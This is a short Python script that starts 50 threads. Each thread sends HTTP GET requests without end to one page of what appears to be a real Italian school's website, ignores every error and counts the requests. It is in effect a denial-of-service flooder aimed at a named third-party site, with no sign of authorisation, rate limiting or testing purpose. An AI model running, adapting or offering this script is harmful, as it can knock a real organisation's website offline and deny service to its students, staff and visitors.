import requests, threading, time

I=0
nThreads = 50

threads = []

def do_request():
    global I
    while True:
        t1 = time.time()
        try:
            requests.get("https://www.liceoischia.edu.it/index.php/cerca-nel-sito/11-generale/167-foto-01", timeout=1)
        except:
            pass
        I=I+1
        print(f'Req n:{I} took: {time.time() - t1} s')

for _ in range(nThreads):
    t = threading.Thread(target=do_request)
    t.daemon = True
    threads.append(t)

for y in range(nThreads):
    threads[y].start()

for y in range(nThreads):
    threads[y].join()